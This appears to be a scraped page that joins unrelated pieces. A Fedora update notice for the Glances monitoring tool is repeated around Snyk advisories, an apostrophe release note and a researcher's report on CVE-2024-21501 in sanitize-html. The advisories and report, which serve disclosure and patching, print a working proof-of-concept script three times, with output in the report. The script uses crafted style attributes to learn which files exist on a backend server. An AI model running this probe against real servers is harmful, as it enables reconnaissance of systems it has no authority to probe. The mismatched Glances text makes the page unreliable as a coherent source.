Summary : A cross-platform system monitoring tool
Description :

Glances is a cross-platform monitoring tool which aims to present a large
amount of monitoring information through a curses or Web based interface.
The information dynamically adapts depending on the size of the user interface

It can also work in client/server mode. Remote monitoring could be done via
terminal, Web interface or API (XML-RPC and RESTful). Stats can also be
exported to files or external time/value databases.

Glances is written in Python and uses libraries to grab information from your
system. It is based on an open architecture where developers can add new
plugins or exports modules.

#### Introduced: 20 Feb 2024

[CVE-2024-21501  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21501) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-200  (opens in a new tab)](https://cwe.mitre.org/data/definitions/200.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `sanitize-html` to version 2.12.1 or higher.

## Overview

[sanitize-html](https://github.com/punkave/sanitize-html) is a library that allows you to clean up user-submitted HTML, preserving whitelisted elements and whitelisted attributes on a per-element basis

Affected versions of this package are vulnerable to Information Exposure when used on the backend and with the `style` attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.

## PoC

```
// index.js
const sanitizeHtml = require('sanitize-html');

const file_exist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/sanitize-html/index.js */");'>@slonser_</a>`;
const file_notexist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/randomlibrary/index.js */");'>@slonser_</a>`;

const file_exist_clean = sanitizeHtml(file_exist, {
allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})

const file_notexist_clean = sanitizeHtml(file_notexist, {
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})
console.log(file_exist_clean, "// valid file path on backend")
console.log(file_notexist_clean, "// invalid file path on backend")

```

### CVSS Scores

version 3.1
### Snyk

5.3 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

Fedora Update Notification
FEDORA-2024-b8e474fbd3
2024-06-02 01:21:00.959089
--------------------------------------------------------------------------------

Name : glances
Product : Fedora 40
Version : 4.0.5
Release : 2.fc40
URL : <https://nicolargo.github.io/glances/>
Summary : A cross-platform system monitoring tool
Description :

Glances is a cross-platform monitoring tool which aims to present a large
amount of monitoring information through a curses or Web based interface.
The information dynamically adapts depending on the size of the user interface

It can also work in client/server mode. Remote monitoring could be done via
terminal, Web interface or API (XML-RPC and RESTful). Stats can also be
exported to files or external time/value databases.

Glances is written in Python and uses libraries to grab information from your
system. It is based on an open architecture where developers can add new
plugins or exports modules.

 -

| In this release of `apostrophe`, we bumped our dependency on `sanitize-html` to `^2.12.1` at a minimum, to ensure that `npm update apostrophe` is sufficient to guarantee a security update is installed.  Version 2.12.1 of `sanitize-html` is a security update, which prevents specially crafted HTML documents from revealing the existence or non-existence of files on the server. The vulnerability did not expose any other information about those files.  Thanks to the [Snyk Security team](https://snyk.io/) for the disclosure and to [Dylan Armstrong](https://dylan.is/) for the fix. |

#### Introduced: 20 Feb 2024

[CVE-2024-21501  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2024-21501) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-200  (opens in a new tab)](https://cwe.mitre.org/data/definitions/200.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

There is no fixed version for `org.webjars.npm:sanitize-html`.

## Overview

Affected versions of this package are vulnerable to Information Exposure when used on the backend and with the `style` attribute allowed, allowing enumeration of files in the system (including project dependencies). An attacker could exploit this vulnerability to gather details about the file system structure and dependencies of the targeted server.

## PoC

```
// index.js
const sanitizeHtml = require('sanitize-html');

const file_exist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/sanitize-html/index.js */");'>@slonser_</a>`;
const file_notexist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/randomlibrary/index.js */");'>@slonser_</a>`;

const file_exist_clean = sanitizeHtml(file_exist, {
allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})

const file_notexist_clean = sanitizeHtml(file_notexist, {
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})
console.log(file_exist_clean, "// valid file path on backend")
console.log(file_notexist_clean, "// invalid file path on backend")

```

### CVSS Scores

version 3.1
### Snyk

5.3 medium

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is some loss of confidentiality. Access to some restricted information is obtained, but the attacker does not have control over what information is obtained, or the amount or kind of loss is limited. The information disclosure does not cause a direct, serious loss to the impacted component.

  **Low**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**

sanitize-html disclose files

 [Raw](/Slonser/8b4d061abe6ee1b2e10c7242987674cf/raw/e6508b0a728e78d1fa6fda48fc76c103d17c6668/REPORT.md)

[**REPORT.md**](#file-report-md)

# Overview

The sanitize-html package, when used on the backend and with the "style" attribute allowed, allows enumeration of files in the system (including project dependencies).

# PoC

1. `npm i sanitize-html`
2. `node index.js`

```
// index.js
const sanitizeHtml = require('sanitize-html');

const file_exist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/sanitize-html/index.js */");'>@slonser_</a>`;
const file_notexist = `<a style='background-image: url("/*# sourceMappingURL=./node_modules/randomlibrary/index.js */");'>@slonser_</a>`;

const file_exist_clean = sanitizeHtml(file_exist, {
allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})

const file_notexist_clean = sanitizeHtml(file_notexist, {
    allowedAttributes: { ...sanitizeHtml.defaults.allowedAttributes, a: ['style'] },
})
console.log(file_exist_clean, "// valid file path on backend")
console.log(file_notexist_clean, "// invalid file path on backend")
```

Output:

```
<a>@slonser_</a> // valid file path on backend
<a style="background-image:url(&quot;/*# sourceMappingURL=./node_modules/randomlibrary/index.js */&quot;)">@slonser_</a> // invalid file path on backend

```

When a file actually exists on the server (and is not a valid source map), we won't receive the "style" attribute. Otherwise, we will receive it.
